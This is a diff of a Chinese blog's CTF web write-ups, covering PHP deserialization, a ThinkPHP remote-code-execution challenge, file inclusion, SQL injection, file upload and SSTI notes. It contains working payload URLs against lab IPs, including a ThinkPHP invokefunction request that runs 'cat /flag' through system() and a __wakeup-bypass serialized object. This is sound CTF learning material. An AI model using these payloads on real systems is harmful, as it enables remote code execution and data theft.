@@ -236,12 +236,12 @@
 <p>–为了payload简洁，一般只编码一个字母</p>
 <p><img src="/2022/06/21/Gongfang-wp/image-20220626110642311.png" alt="image-20220626110642311"></p>
 <p>得到flag</p>
-<h2 id="5-Web-python-template-injection"><a href="#5-Web-python-template-injection" class="headerlink" title="5.Web_python_template_injection"></a>5.Web_python_template_injection</h2><h3 id="1-题目描述-15"><a href="#1-题目描述-15" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
-<h3 id="2）wp-3"><a href="#2）wp-3" class="headerlink" title="2）wp"></a>2）wp</h3><p>该题属于ssti，建议先了解一些<a href="../../../../2022/05/28/Web-study">ssti</a>的模板注入，和这两篇文章了解一些flask运行原理</p>
+<h2 id="5-Web-python-template-injection"><a href="#5-Web-python-template-injection" class="headerlink" title="5.Web_python_template_injection"></a>5.Web_python_template_injection</h2><p>该题属于ssti，建议先了解一些<a href="../../../../2022/05/28/Web-study">ssti</a>的模板注入，和这两篇文章了解一些flask运行原理</p>
 <p><a href="https://www.freebuf.com/column/187845.html">https://www.freebuf.com/column/187845.html</a>  </p>
 <p><a href="https://xz.aliyun.com/t/3679">https://xz.aliyun.com/t/3679</a></p>
 <p>然后再做这道题</p>
-<h2 id="6-Web-php-unserialize"><a href="#6-Web-php-unserialize" class="headerlink" title="6.Web_php_unserialize"></a>6.Web_php_unserialize</h2><h3 id="1-题目描述-16"><a href="#1-题目描述-16" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
+<p><a href="https://blog.csdn.net/Mr_helloword/article/details/107949217">大佬wp</a></p>
+<h2 id="6-Web-php-unserialize"><a href="#6-Web-php-unserialize" class="headerlink" title="6.Web_php_unserialize"></a>6.Web_php_unserialize</h2><h3 id="1-题目描述-15"><a href="#1-题目描述-15" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
 <h3 id="2-wp-13"><a href="#2-wp-13" class="headerlink" title="2)wp"></a>2)wp</h3><p>看名字可知，这是道<a href="../../../../2022/05/28/Web-study">php反序列化</a>类型的题</p>
 <p>开始先分析一下php代码</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
@@ -277,7 +277,7 @@
 <p>访问</p>
 <p><code>http://111.200.241.244:50547/?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code></p>
 <p>得到flag</p>
-<h2 id="7-php-rce"><a href="#7-php-rce" class="headerlink" title="7.php_rce"></a>7.php_rce</h2><h3 id="1-题目描述-17"><a href="#1-题目描述-17" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
+<h2 id="7-php-rce"><a href="#7-php-rce" class="headerlink" title="7.php_rce"></a>7.php_rce</h2><h3 id="1-题目描述-16"><a href="#1-题目描述-16" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
 <h3 id="2-wp-14"><a href="#2-wp-14" class="headerlink" title="2)wp"></a>2)wp</h3><p>开始界面如下</p>
 <p><img src="/2022/06/21/Gongfang-wp/image-20220630174402928.png" alt="image-20220630174402928"></p>
 <p>（看到thinkphp我就想起今年国赛也有一道think PHP的题，爆0，麻了）</p>
@@ -298,7 +298,7 @@
 <p>用cat显示出来</p>
 <p><code>http://111.200.241.244:57210/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag</code></p>
 <p>得到flag</p>
-<h2 id="8-Web-php-include"><a href="#8-Web-php-include" class="headerlink" title="8.Web_php_include"></a>8.Web_php_include</h2><h3 id="1-题目描述-18"><a href="#1-题目描述-18" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
+<h2 id="8-Web-php-include"><a href="#8-Web-php-include" class="headerlink" title="8.Web_php_include"></a>8.Web_php_include</h2><h3 id="1-题目描述-17"><a href="#1-题目描述-17" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
 <h3 id="2-wp-15"><a href="#2-wp-15" class="headerlink" title="2)wp"></a>2)wp</h3><p>这道题先了解<a href="../../../../2022/05/28/Web-study">php伪协议</a></p>
 <p>看名字很清楚是到文件包含的题目</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="keyword">while</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123;  <span class="variable">$page</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
@@ -319,10 +319,10 @@
 <p>显示fl4gisisish3r3.php内容</p>
 <p><img src="/2022/06/21/Gongfang-wp/image-20220626223253399.png" alt="image-20220626223253399"></p>
 <p>得到flag</p>
-<h2 id="9-supersqli"><a href="#9-supersqli" class="headerlink" title="9.supersqli"></a>9.supersqli</h2><h3 id="1-题目描述-19"><a href="#1-题目描述-19" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>随便注</p>
-<h3 id="2）wp-4"><a href="#2）wp-4" class="headerlink" title="2）wp"></a>2）wp</h3><p>这道题之前在buuctf上做过，考察堆叠注入，wp可以在<a href="../../../../2022/06/21/buuctf-wp">buuctf-wp</a>看一下</p>
-<h2 id="10-warmup"><a href="#10-warmup" class="headerlink" title="10.warmup"></a>10.warmup</h2><h3 id="1-题目描述-20"><a href="#1-题目描述-20" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
-<h3 id="2）wp-5"><a href="#2）wp-5" class="headerlink" title="2）wp"></a>2）wp</h3><p>开始就只有一张图片，先看一下它源码</p>
+<h2 id="9-supersqli"><a href="#9-supersqli" class="headerlink" title="9.supersqli"></a>9.supersqli</h2><h3 id="1-题目描述-18"><a href="#1-题目描述-18" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>随便注</p>
+<h3 id="2）wp-3"><a href="#2）wp-3" class="headerlink" title="2）wp"></a>2）wp</h3><p>这道题之前在buuctf上做过，考察堆叠注入，wp可以在<a href="../../../../2022/06/21/buuctf-wp">buuctf-wp</a>看一下</p>
+<h2 id="10-warmup"><a href="#10-warmup" class="headerlink" title="10.warmup"></a>10.warmup</h2><h3 id="1-题目描述-19"><a href="#1-题目描述-19" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
+<h3 id="2）wp-4"><a href="#2）wp-4" class="headerlink" title="2）wp"></a>2）wp</h3><p>开始就只有一张图片，先看一下它源码</p>
 <p><img src="/2022/06/21/Gongfang-wp/image-20220703104834305.png" alt="image-20220703104834305"></p>
 <p>看到有一个source.php文件</p>
 <p>访问<code>http://111.200.241.244:59132/source.php</code></p>
@@ -367,8 +367,8 @@
 <p><strong>补充</strong></p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_substr</span>() 函数返回字符串的一部分，之前我们学过 <span class="title function_ invoke__">substr</span>() 函数，它只针对英文字符，如果要分割的中文文字则需要使用 <span class="title function_ invoke__">mb_substr</span>()。</span><br><span class="line">实例</span><br><span class="line">从字符串中返回 <span class="string">&quot;菜鸟&quot;</span>：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mb_substr</span>(<span class="string">&quot;菜鸟教程&quot;</span>, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line"><span class="comment">// 输出：菜鸟</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">----------------</span><br><span class="line"><span class="title function_ invoke__">mb_strpos</span>()：返回要查找的字符串在别一个字符串中首次出现的位置</span><br><span class="line"><span class="title function_ invoke__">mb_strpos</span> (haystack ,needle )</span><br><span class="line">haystack：要被检查的字符串。</span><br><span class="line">needle：要搜索的字符串。</span><br><span class="line">----------------</span><br><span class="line"> in_array函数功能检查数组中是否存在某个值</span><br></pre></td></tr></table></figure>
 
-<h2 id="11-NewsCenter"><a href="#11-NewsCenter" class="headerlink" title="11.NewsCenter"></a>11.NewsCenter</h2><h3 id="1-题目描述-21"><a href="#1-题目描述-21" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
-<h3 id="2）wp-6"><a href="#2）wp-6" class="headerlink" title="2）wp"></a>2）wp</h3><p>该题考查的是SQL注入，如果不清楚开始看到输入框，就应该试试各种方式，分析存在什么漏洞，比如xss或sql等等</p>
+<h2 id="11-NewsCenter"><a href="#11-NewsCenter" class="headerlink" title="11.NewsCenter"></a>11.NewsCenter</h2><h3 id="1-题目描述-20"><a href="#1-题目描述-20" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
+<h3 id="2）wp-5"><a href="#2）wp-5" class="headerlink" title="2）wp"></a>2）wp</h3><p>该题考查的是SQL注入，如果不清楚开始看到输入框，就应该试试各种方式，分析存在什么漏洞，比如xss或sql等等</p>
 <p>开始先判断sql注入存在</p>
 <p>输入**1’**，报错返回空白页面</p>
 <p>然后判断字段数</p>
@@ -404,8 +404,8 @@
 <p><img src="/2022/06/21/Gongfang-wp/image-20220703205758800.png" alt="image-20220703205758800"></p>
 <p>得到flag</p>
 <p>这里用sqlmap也可以，但还是试试手工注入更好</p>
-<h2 id="12-NaNaNaNNaN-Batman"><a href="#12-NaNaNaNNaN-Batman" class="headerlink" title="12.NaNaNaNNaN-Batman"></a>12.NaNaNaNNaN-Batman</h2><h3 id="1-题目描述-22"><a href="#1-题目描述-22" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
-<h3 id="2）wp-7"><a href="#2）wp-7" class="headerlink" title="2）wp"></a>2）wp</h3><p>这个开始有点懵，借鉴了大佬的wp，才理解了一些，需要wp可以认真看看这篇文章，以下只加上个人理解和个人认为文章重点</p>
+<h2 id="12-NaNaNaNNaN-Batman"><a href="#12-NaNaNaNNaN-Batman" class="headerlink" title="12.NaNaNaNNaN-Batman"></a>12.NaNaNaNNaN-Batman</h2><h3 id="1-题目描述-21"><a href="#1-题目描述-21" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
+<h3 id="2）wp-6"><a href="#2）wp-6" class="headerlink" title="2）wp"></a>2）wp</h3><p>这个开始有点懵，借鉴了大佬的wp，才理解了一些，需要wp可以认真看看这篇文章，以下只加上个人理解和个人认为文章重点</p>
 <p><a href="https://blog.csdn.net/qq_41617034/article/details/91946853">原文链接</a></p>
 <p>js源代码分析：</p>
 <p>_等于一个$函数内容</p>
@@ -440,8 +440,8 @@ eval函数，这是执行函数；这里执行了_变量中的内容也就是&#3
 
 <figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">splice</span><span class="params">()</span></span> 方法向/从数组中添加/删除项目，然后返回被删除的项目。</span><br><span class="line">注释：该方法会改变原始数组。</span><br><span class="line">语法</span><br><span class="line">arrayObject<span class="selector-class">.splice</span>(index,howmany,item1,.....,itemX)</span><br><span class="line">参数	                         描述</span><br><span class="line">index	                     必需。整数，规定添加/删除项目的位置，使用负数可从数组结尾处规定位置。</span><br><span class="line">howmany	                     必需。要删除的项目数量。如果设置为 <span class="number">0</span>，则不会删除项目。</span><br><span class="line">item1, ..., itemX	         可选。向数组添加的新项目。</span><br></pre></td></tr></table></figure>
 
-<h2 id="13-unserialize3"><a href="#13-unserialize3" class="headerlink" title="13.unserialize3"></a>13.unserialize3</h2><h3 id="1-题目描述-23"><a href="#1-题目描述-23" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
-<h3 id="2）wp-8"><a href="#2）wp-8" class="headerlink" title="2）wp"></a>2）wp</h3><p>这道题需要了解<a href="../../../../2022/05/28/Web-study">php反序列化</a>中__wakeup漏洞的利用,还有<a href="../../../../2022/05/28/Web-study">php魔术方法</a></p>
+<h2 id="13-unserialize3"><a href="#13-unserialize3" class="headerlink" title="13.unserialize3"></a>13.unserialize3</h2><h3 id="1-题目描述-22"><a href="#1-题目描述-22" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
+<h3 id="2）wp-7"><a href="#2）wp-7" class="headerlink" title="2）wp"></a>2）wp</h3><p>这道题需要了解<a href="../../../../2022/05/28/Web-study">php反序列化</a>中__wakeup漏洞的利用,还有<a href="../../../../2022/05/28/Web-study">php魔术方法</a></p>
 <p><code>__wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。</code></p>
 <p>开始的代码不完整，是一段残缺的PHP代码，根据题目名字知道这是给反序列化的题目，?code=可能是提醒需要在url利用以GET方式提交code值</p>
 <p><img src="https://img-blog.csdnimg.cn/669297deb27d4dce9bbdac477d78c6b7.png" alt="在这里插入图片描述"></p>
@@ -467,7 +467,7 @@ eval函数，这是执行函数；这里执行了_变量中的内容也就是&#3
 <p>补充：</p>
 <figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line">php实例化：是指在面向对象的编程中，把用类创建对象的过程称为实例化，是将一个抽象的概念类，具体到该类实物的过程，实例化过程中一般由【类名 对象名 = <span class="keyword">new</span> 类名（参数<span class="number">1</span>，参数<span class="number">2.</span>..参数n）】构成。</span><br><span class="line"></span><br><span class="line">php类对象是什么意思？</span><br><span class="line">类 − 定义了一件事物的抽象特点。类的定义包含了数据的形式以及对数据的操作。</span><br><span class="line">对象 − 是类的实例。</span><br><span class="line">在面向对象的程序设计（英语：<span class="built_in">Object</span>-oriented programming，缩写：OOP）中，对象是一个由信息及对信息进行处理的描述所组成的整体，是对现实世界的抽象。在现实世界里我们所面对的事情都是对象，如计算机、电视机、自行车等。</span><br></pre></td></tr></table></figure>
 
-<h2 id="14-upload1"><a href="#14-upload1" class="headerlink" title="14.upload1"></a>14.upload1</h2><h3 id="1-题目描述-24"><a href="#1-题目描述-24" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
+<h2 id="14-upload1"><a href="#14-upload1" class="headerlink" title="14.upload1"></a>14.upload1</h2><h3 id="1-题目描述-23"><a href="#1-题目描述-23" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
 <h3 id="2-wp-16"><a href="#2-wp-16" class="headerlink" title="2)wp"></a>2)wp</h3><p>典型的文件上传漏洞，可以先把upload-labs线下靶场学习一下</p>
 <p>先直接上传php文件，发现被拦截</p>
 <p><img src="/2022/06/21/Gongfang-wp/image-20220704104557362.png" alt="image-20220704104557362"></p>
@@ -482,6 +482,10 @@ eval函数，这是执行函数；这里执行了_变量中的内容也就是&#3
 <p><img src="/2022/06/21/Gongfang-wp/image-20220704105139801.png" alt="image-20220704105139801"></p>
 <p>打开文件</p>
 <p>得到flag</p>
+<hr>
+<p>后面的题难度飞升，水平有限，后面的题仅写一些个人笔记，建议认真阅读其他大佬的wp，遇到难点，建议先巩固概念基础</p>
+<h2 id="15-easytornado"><a href="#15-easytornado" class="headerlink" title="15.easytornado"></a>15.easytornado</h2><p>一道tornado框架题，属于ssti注入，建议先看一些文章</p>
+<p>了解了再尝试完成</p>
 ]]></content>
       <categories>
         <category>网络安全学习</category>
@@ -560,7 +564,10 @@ eval函数，这是执行函数；这里执行了_变量中的内容也就是&#3
 <h4 id="3-防御-11"><a href="#3-防御-11" class="headerlink" title="3.防御"></a>3.防御</h4><p>1)尽量不要使用命令执行函数。</p>
 <p>2)不要让用户控制参数。</p>
 <p>3)执行前做好检测和过滤。</p>
-<h3 id="SSTI漏洞篇"><a href="#SSTI漏洞篇" class="headerlink" title="SSTI漏洞篇"></a>SSTI漏洞篇</h3><h4 id="1-SSTI漏洞原理"><a href="#1-SSTI漏洞原理" class="headerlink" title="1.SSTI漏洞原理"></a>1.SSTI漏洞原理</h4><p>SSTI是一种注入类的漏洞，其<u><strong>成因也可以类比SQL注入</strong></u>。<br>SQL注入是从用户获得一个输入，然后用后端脚本语言进行数据库查询，利用输入来拼接我们想要的SQL语句。SSTI也是获取一个输入，然后在后端的渲染处理上进行语句的拼接执行。但是和SQL注入不同的，SSTI利用的是现有的网站模板引擎，主要针对Python、PHP、JAVA的一些网站处理框架，比如Python的jinja2、mako、tornado、Django，PHP的smarty twig，java的jade velocity。当这些框架对运用渲染函数生成html的时候，在过滤不严情况下，通过构造恶意输入数据，从而达到getshell或其他目的。<br><u><strong>一句话就是服务端在接收用户输入或用户可控参数后，未作处理或未进行严格过滤，直接嵌入模板渲染，导致执行恶意代码</strong></u>。</p>
+<h3 id="SSTI漏洞篇"><a href="#SSTI漏洞篇" class="headerlink" title="SSTI漏洞篇"></a>SSTI漏洞篇</h3><h4 id="1-SSTI漏洞原理"><a href="#1-SSTI漏洞原理" class="headerlink" title="1.SSTI漏洞原理"></a>1.SSTI漏洞原理</h4><p><a href="https://xz.aliyun.com/t/3679#toc-0">推荐文章</a></p>
+<p>SSTI是一种注入类的漏洞，其<u><strong>成因也可以类比SQL注入</strong></u>。<br>SQL注入是从用户获得一个输入，然后用后端脚本语言进行数据库查询，利用输入来拼接我们想要的SQL语句。SSTI也是获取一个输入，然后在后端的渲染处理上进行语句的拼接执行。但是和SQL注入不同的，</p>
+<p>SSTI利用的是现有的网站模板引擎，主要针对Python、PHP、JAVA的一些网站处理框架，比如Python的<strong>jinja2、mako、tornado、Django</strong>，PHP的<strong>smarty twig</strong>，java的<strong>jade velocity</strong>。当这些框架对运用渲染函数生成html的时候，在过滤不严情况下，通过构造恶意输入数据，从而达到getshell或其他目的。</p>
+<p><u><strong>一句话就是服务端在接收用户输入或用户可控参数后，未作处理或未进行严格过滤，直接嵌入模板渲染，导致执行恶意代码</strong></u>。</p>
 <p><strong>模板注入</strong>涉及的是服务端Web应用使用模板引擎<strong>渲染用户请求的过程</strong>，<br> 服务端把<strong>用户输入的内容渲染成模板</strong>就可能造成SSTI(Server-Side Template Injection)</p>
 <p>模板渲染接受的参数需要用两个大括号<code>&#123;&#123;&#125;&#125;</code>括起来</p>
 <h4 id="2-危害-12"><a href="#2-危害-12" class="headerlink" title="2.危害"></a>2.危害</h4><p>攻击者在服务器输入语句，服务端将其<u><strong>作为Web应用模板内容的一部分</strong></u>，在进行<u><strong>目标编译渲染</strong></u>的过程中，<u><strong>进行了语句的拼接，执行了所插入的恶意内容</strong></u>，从而<u><strong>导致信息泄露、代码执行、GetShell等</strong></u>问题</p>
